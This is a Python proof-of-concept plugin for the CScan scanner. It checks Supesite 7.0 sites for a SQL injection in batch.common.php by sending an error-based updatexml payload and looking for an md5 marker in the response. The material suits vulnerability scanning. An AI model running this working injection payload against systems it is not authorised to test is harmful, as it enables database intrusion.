# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.error
import urllib.parse


class Vuln(ABVuln):
    vuln_id = 'Supesite_0001'  # 平台漏洞编号，留空
    name = 'Supesite 7.0 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
        SupeSite是一套拥有独立的内容管理(CMS)功能，并集成了Web2.0社区个人门户系统X-Space，拥有强大的聚合功能的社区门户系统。 SupeSite可以实现对站内的论坛(Discuz!)、个人空间(X-Space)信息进行内容聚合。任何站长，都可以通过SupeSite，轻松构建一个面向Web2.0的社区门户。
        /batch.common.php $_GET[name]过滤不严谨。
    '''  # 漏洞描述
    ref = 'https://www.secpulse.com/archives/46521.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Supesite'  # 漏洞应用名称
    product_version = '7.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '280452fd-fd8a-4433-80c7-3bb0cd51a63c'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-07'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ("/batch.common.php?action=modequote&cid=1&name=members where 1=1 and 1=("
                       "updatexml(1,concat(0x5e24,(select md5(1)),0x5e24),1))%23")
            verify_url = self.target + payload
            req = requests.get(verify_url)
            if "c4ca4238a0b923820dcc509a6f75849b" in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
